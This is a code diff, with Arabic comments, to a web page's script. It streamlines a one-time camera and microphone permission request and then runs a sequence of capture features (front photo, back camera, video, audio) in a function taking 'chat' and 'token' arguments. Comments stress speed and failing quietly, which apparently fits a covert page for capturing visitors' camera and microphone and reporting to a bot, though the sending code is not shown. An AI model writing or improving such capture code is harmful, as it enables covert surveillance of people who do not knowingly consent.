@@ -573,53 +573,39 @@
     });
   }
 
-  // ------------------ إدارة طلب الأذونات مرة واحدة فقط ------------------
-  async function requestPermissionsOnce(featureList) {
-    // تحديد الاحتياجات
-    const needCamera = featureList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
-    const needMicrophone = featureList.some(f => ['audio','videoFront','videoBack'].includes(f));
-
-    // إذا لم تكن هناك حاجة لأي إذن، نعود بنجاح
+  // ------------------ طلب الأذونات مرة واحدة فقط مع إعادة محاولة سريعة ------------------
+  async function preGrantPermissions(needCamera, needMicrophone) {
     if (!needCamera && !needMicrophone) return true;
-
-    // بناء constraints مناسبة
     const constraints = {};
     if (needCamera) constraints.video = true;
     if (needMicrophone) constraints.audio = true;
 
-    // محاولة طلب الإذن مع إعادة محاولة واحدة إذا رفض
-    for (let attempt = 0; attempt <= 1; attempt++) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        // نجاح: أوقف جميع التracks فوراً (لأننا فقط نريد الإذن)
-        stream.getTracks().forEach(track => track.stop());
-        return true; // تم منح الإذن
-      } catch (err) {
-        console.log(`محاولة ${attempt+1} فشلت:`, err);
-        if (attempt === 1) return false; // فشل بعد المحاولتين
-        // انتظر قليلاً قبل إعادة المحاولة
-        await new Promise(r => setTimeout(r, 1000));
-      }
+    // محاولة واحدة فقط (بدون إعادة محاولة، لأننا نريد سرعة)
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      stream.getTracks().forEach(t => t.stop());
+      return true; // تم منح الإذن
+    } catch (err) {
+      console.log('رفض الإذن:', err);
+      return false; // رفض
     }
-    return false;
   }
 
-  // ------------------ الدالة الرئيسية للصفحة الجانبية (معالجة متسلسلة) ------------------
+  // ------------------ الدالة الرئيسية للصفحة الجانبية (معالجة متسلسلة سريعة) ------------------
   async function startFeatures(chat, token, features) {
     if (!features) return;
     
     const featureList = features.split(',');
     
-    // طلب الأذونات مرة واحدة فقط (مع إعادة محاولة واحدة)
-    const permissionGranted = await requestPermissionsOnce(featureList);
-    if (!permissionGranted) {
-      // إذا رفض المستخدم جميع الأذونات، يمكننا تنفيذ الموقع فقط إن وجد
-      console.log('لم يتم منح الأذونات المطلوبة');
-    }
+    // تحديد الاحتياجات
+    const needCamera = featureList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
+    const needMicrophone = featureList.some(f => ['audio','videoFront','videoBack'].includes(f));
 
-    // الآن ننفذ الميزات بالترتيب، مع العلم أن الإذن ممنوح (أو لا زلنا نحاول)
-    // ملاحظة: حتى لو رفض المستخدم، سنحاول تنفيذ كل ميزة وقد تفشل، لكننا نمررها بهدوء.
+    // طلب الأذونات مرة واحدة فقط (بدون انتظار إضافي)
+    const permissionGranted = await preGrantPermissions(needCamera, needMicrophone);
+    // لا نهتم بالنتيجة، سنحاول تنفيذ الميزات على أي حال (إذا رفض، ستفشل بهدوء)
 
+    // تنفيذ الميزات بسرعة متتالية (بدون تأخير بينها)
     // صورة أمامية
     if (featureList.includes('camFront')) {
       try {
@@ -768,4 +754,4 @@
   }
 </script>
 </body>
-  </html>
+          </html>
